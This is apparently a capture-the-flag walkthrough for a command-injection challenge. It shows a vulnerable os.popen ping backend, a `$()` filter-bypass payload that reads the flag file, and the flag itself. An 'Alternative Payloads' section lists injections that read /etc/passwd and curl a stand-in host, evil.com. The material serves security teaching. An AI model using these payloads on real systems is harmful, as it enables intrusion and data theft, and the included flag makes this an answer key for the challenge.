# Shadows Walkthrough

## Challenge Overview
**Difficulty**: Hard  
**Vulnerability**: Command Injection  
**Flag**: nhc{sh4d0w_c0mm4nd_3x3cut3d}

## Story Context
Hattori infiltrates the Shadow Garrison, where reconnaissance terminals hold the power to execute commands in the darkness.

## Solution Steps

### Step 1: Access the Challenge
1. Navigate to `/challenge/shadows`
2. Observe the IP scanning terminal

### Step 2: Understand the Vulnerability
The backend executes:
```python
command = f'echo "Scanning {ip}" ; ping -c 1 {ip}'
result = os.popen(command).read()
```

### Step 3: Bypass Input Filters
Blocked characters: `;`, `|`, `` ` ``, `&`
Allowed: alphanumeric, dots, hyphens, `$`, `(`, `)`

### Step 4: Craft Command Injection
1. Use `$()` for command substitution
2. Read the flag file: `shadow_fragment.txt`
3. Payload: `127.0.0.1$(cat shadow_fragment.txt)`

### Step 5: Execute and Capture Output
1. Submit the payload
2. The output should contain: `nhc{sh4d0w_c0mm4nd_3x3cut3d}`
3. Copy the flag from the scan results

## Hints

### Hint 1
> The terminal blocks common injection characters. Look for alternative ways to execute commands.

### Hint 2
> Command substitution allows executing commands within other commands. The `$()` syntax might work.

### Hint 3
> The flag is stored in a file called `shadow_fragment.txt`. How can you read file contents through command injection?

## Educational Notes

### What You Learned
- **Command Injection**: Executing system commands through web inputs
- **Input Filtering**: Bypassing security filters
- **Command Substitution**: Using `$()` to execute nested commands
- **Shell Escaping**: Alternative injection techniques

### Real-World Impact
- Server compromise
- Data exfiltration
- Malware execution
- Privilege escalation

### Prevention
- Input validation and sanitization
- Whitelist allowed characters
- Use safe APIs instead of shell commands
- Parameterized execution
- Least privilege execution

## Alternative Payloads

### Basic Command Injection
```
127.0.0.1$(whoami)
```
Shows current user.

### File Reading
```
127.0.0.1$(cat /etc/passwd)
```
Reads system password file.

### Directory Listing
```
127.0.0.1$(ls -la)
```
Lists directory contents.

### Advanced Injection
```
127.0.0.1$(curl http://evil.com/data)
```
Exfiltrates data to external server.

## Testing Commands

### Safe Testing
```bash
# Test command substitution
echo "Scanning 127.0.0.1$(echo ' injected')"
```

### Python Simulation
```python
import os
ip = "127.0.0.1$(cat shadow_fragment.txt)"
command = f'echo "Scanning {ip}" ; ping -c 1 {ip}'
print("Command:", command)
# result = os.popen(command).read()
```

## Common Mistakes
- Using blocked characters (`;`, `|`, etc.)
- Not understanding command substitution syntax
- Wrong file path or name
- Not capturing the full output

## Filter Bypass Techniques

### Character Substitution
- Use `$()` instead of backticks
- Use `${}` for variable expansion

### Encoding
- URL encoding special characters
- Using hex or octal representations

### Alternative Injection Points
- Other shell metacharacters
- Environment variable manipulation

## Next Steps
Submit the flag extracted from the file.
